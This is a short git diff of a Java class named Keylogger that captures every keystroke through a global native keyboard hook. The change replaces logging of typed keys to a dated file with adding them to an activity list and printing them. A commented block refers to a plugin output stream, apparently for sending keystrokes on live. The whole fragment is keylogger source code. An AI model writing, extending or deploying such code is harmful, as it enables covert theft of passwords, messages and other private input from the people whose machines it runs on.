@@ -25,13 +25,13 @@ public class Keylogger implements NativeKeyListener {
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent arg0) {		
 		try {			
-			PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter(getTodaysFile(), true)));
-		    out.print(arg0.getKeyChar());
-		    out.close();
 			
+			
+		    Activities.add(new Key(arg0.getKeyChar()));
+			System.out.println(arg0.getKeyChar());
+		    
 			/*if (LIVE RUNNING && KeyloggerPlugin.dos != null) {
-				Activities.add(new Key(arg0.getKeyChar()));
-				System.out.println(arg0.getKeyChar());
+				
 			}*/
 		} catch (Exception e) {
 			System.err.println("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
